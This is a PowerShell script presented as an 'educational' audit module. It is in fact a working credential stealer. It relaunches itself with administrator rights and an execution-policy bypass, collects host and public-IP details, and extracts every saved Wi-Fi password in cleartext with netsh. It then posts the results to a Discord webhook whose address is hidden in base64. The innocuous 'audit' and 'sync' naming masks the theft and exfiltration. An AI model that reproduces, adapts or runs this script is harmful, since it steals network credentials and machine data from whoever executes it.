# ==============================================================================
# AUDIT SCRIPT - EDUCATIONAL MODULE
# Version: 2.3.3
# Migration: Telegram -> Discord
# ==============================================================================

# ========== CONFIGURATION ==========
$VerboseMode = $true
$AuditVersion = '2.3.3'

# Encoded Discord Webhook (Educational placeholder)
$Channel_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=='
$Channel_URI = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Channel_B64))

# ========== CORE UTILITIES ==========

function Write-InternalLog {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [ValidateSet('Cyan', 'Green', 'Yellow', 'Red')]
        [string]$Color = 'Cyan'
    )
    if ($VerboseMode) {
        Write-Host "[*] $Message" -ForegroundColor $Color
    }
}

function Assert-PrivilegedContext {
    Write-InternalLog 'Verifying execution context...'
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-InternalLog 'Escalation required. Relaunching...' 'Yellow'
        try {
            Start-Process -FilePath powershell -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$PSCommandPath`"" -Verb RunAs
            exit 0
        } catch {
            Write-InternalLog "Escalation failed: $($_.Exception.Message)" 'Red'
            exit 1
        }
    }
}

# ========== DATA ACQUISITION ==========

function Get-HostContext {
    Write-InternalLog 'Acquiring host metrics...'
    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        
        $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue | 
               Measure-Object -Property Capacity -Sum
        
        $publicIp = try { 
            (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5 -ErrorAction Stop) 
        } catch { 'Unavailable' }

        return [PSCustomObject]@{
            HostName   = $env:COMPUTERNAME
            Model      = if ($cs) { $cs.Model } else { 'N/A' }
            Vendor     = if ($cs) { $cs.Manufacturer } else { 'N/A' }
            OS         = if ($os) { $os.Caption } else { 'N/A' }
            Build      = if ($os) { $os.Version } else { 'N/A' }
            CPU        = if ($cpu) { ($cpu | Select-Object -First 1).Name } else { 'N/A' }
            Cores      = if ($cpu) { ($cpu | Select-Object -First 1).NumberOfCores } else { 0 }
            RAM        = if ($mem.Sum) { [Math]::Round($mem.Sum / 1GB, 2) } else { 0 }
            GPU        = if ($gpu) { ($gpu | Select-Object -First 1).Name } else { 'N/A' }
            ExternalIP = $publicIp
            Timestamp  = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        }
    } catch {
        Write-InternalLog "Data acquisition failure: $($_.Exception.Message)" 'Red'
        return $null
    }
}

function Get-SignalCredentials {
    Write-InternalLog 'Extracting signal credentials...'
    try {
        $profiles = netsh wlan show profiles 2>$null |
                    Select-String 'All User Profile' |
                    ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | 
                    Sort-Object -Unique

        $creds = @()
        foreach ($p in $profiles) {
            $info = netsh wlan show profile name="$p" key=clear 2>$null
            $key = ($info | Select-String 'Key Content' | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
            
            $creds += [PSCustomObject]@{
                SSID = $p
                Key  = if ($key) { $key } else { '<Open/Managed>' }
            }
        }
        return $creds
    } catch {
        Write-InternalLog "Signal extraction error: $($_.Exception.Message)" 'Red'
        return @()
    }
}

# ========== OUTPUT GENERATION ==========

function New-AuditPackage {
    param($Metrics, $Credentials)
    
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.AppendLine('### HOST METRICS')
    [void]$sb.AppendLine('```yaml')
    [void]$sb.Append('Host:       ').AppendLine($Metrics.HostName)
    [void]$sb.Append('System:     ').Append($Metrics.Vendor).Append(' ').AppendLine($Metrics.Model)
    [void]$sb.Append('Platform:   ').Append($Metrics.OS).Append(' (').Append($Metrics.Build).AppendLine(')')
    [void]$sb.Append('Processor:  ').Append($Metrics.CPU).Append(' (').Append($Metrics.Cores).AppendLine(' Cores)')
    [void]$sb.Append('Memory:     ').Append($Metrics.RAM).AppendLine(' GB')
    [void]$sb.Append('Graphics:   ').AppendLine($Metrics.GPU)
    [void]$sb.Append('Network:    ').AppendLine($Metrics.ExternalIP)
    [void]$sb.Append('Captured:   ').AppendLine($Metrics.Timestamp)
    [void]$sb.AppendLine('```')
    [void]$sb.AppendLine('### SIGNAL CREDENTIALS')
    [void]$sb.AppendLine('```')
    
    foreach ($c in $Credentials) {
        [void]$sb.Append('SSID: ').Append($c.SSID).Append(' | KEY: ').AppendLine($c.Key)
    }
    
    [void]$sb.AppendLine('```')
    return $sb.ToString()
}

# ========== DISPATCH ==========

function Sync-RemoteChannel {
    param([string]$Payload)
    
    Write-InternalLog 'Syncing with remote channel...'
    try {
        $discordBody = @{
            username   = 'Audit Bot'
            avatar_url = 'https://cdn-icons-png.flaticon.com/512/1048/1048953.png'
            embeds     = @(
                @{
                    title       = "Audit Report - $env:COMPUTERNAME"
                    description = $Payload
                    color       = 5814783
                    footer      = @{ text = "Audit Engine v$AuditVersion" }
                }
            )
        }

        $json = $discordBody | ConvertTo-Json -Depth 5
        
        $response = Invoke-RestMethod -Uri $Channel_URI `
                                     -Method Post `
                                     -Body $json `
                                     -ContentType 'application/json' `
                                     -ErrorAction Stop
        
        Write-InternalLog 'Sync successful.' 'Green'
    } catch {
        Write-InternalLog "Sync failed: $($_.Exception.Message)" 'Red'
    }
}

# ========== ORCHESTRATION ==========

function Execute-AuditFlow {
    Assert-PrivilegedContext
    
    $metrics = Get-HostContext
    if ($null -eq $metrics) { exit 1 }
    
    $creds = Get-SignalCredentials
    $package = New-AuditPackage -Metrics $metrics -Credentials $creds
    
    Sync-RemoteChannel -Payload $package
    
    Write-InternalLog 'Audit flow completed.' 'Green'
}

# START
Execute-AuditFlow
